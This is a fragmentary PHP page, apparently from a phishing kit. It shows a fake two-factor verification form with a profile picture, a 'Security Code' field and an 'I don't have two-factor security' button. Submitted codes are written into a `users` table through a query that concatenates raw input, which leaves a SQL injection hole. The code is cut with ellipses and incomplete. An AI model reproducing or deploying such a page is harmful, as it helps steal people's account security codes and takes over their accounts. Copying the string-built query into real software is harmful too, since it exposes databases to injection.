...
if($_POST){
    ...
    $gücelleverileri = $spexcon->query("UPDATE `users` SET `faktor`='".$faktor."' WHERE user='".$username."'");
...
<br><br>
            <center><img style="max-width:50%; border-radius:50%; margin-top:-70px;" width="130"  src="<?php echo $pp; ?>"></center><br>
                ...
                <div class="form_item form_width">
                    <div class="alert info"><?php echo $faktoryazi ?>
</div>
                </div>
                <div class="form_item form_width my0">
                    <input id="user_input" type="number" name="factor" placeholder="Security Code" autocapitalize="off" required>
                </div>
                ...
                <a href="confirmed.php">
                    <button type="submit" id="submit_button">
					<span class="text">I don't have two-factor security</span>
					<span class="spinner" style="display: none"><img src="assets/theme/sloker/lib/img/spinner.svg" width="25px"></span>
